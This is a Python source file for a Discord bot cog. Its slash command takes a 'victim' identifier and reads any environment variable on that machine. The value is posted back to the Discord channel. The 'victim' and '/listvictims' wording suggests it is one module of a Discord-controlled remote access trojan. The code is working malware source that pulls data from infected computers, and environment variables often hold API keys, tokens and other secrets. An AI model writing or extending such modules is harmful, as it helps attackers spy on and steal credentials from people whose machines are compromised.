from disnake.ext import commands
from datetime import datetime

import os


class GetEnvironment(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def get_environment(self, ctx, victim: str, environment: str):
        """Finds the values of environment values

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        environment: The variable of which the value is wanted
        """
        if self.bot.valid(victim):
            try:
                value = os.getenv(environment)
            except:  # noqa: E722
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Invalid environment variable!", datetime.now()
                    )
                )

            if value is None:
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Variable's value is empty!", datetime.now()
                    )
                )

            if value == "":
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Variable's value is empty!", datetime.now()
                    )
                )

            if len(value) >= 1023:
                return await ctx.response.send_message(
                    f"The value for {environment} is:\n```{value}```"
                )

            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    "Found environment variable", datetime.now()
                ).add_field(
                    name="Value for " + environment + " is:",
                    value="```" + value + "```",
                )
            )


def setup(bot: commands.Bot):
    bot.add_cog(GetEnvironment(bot))
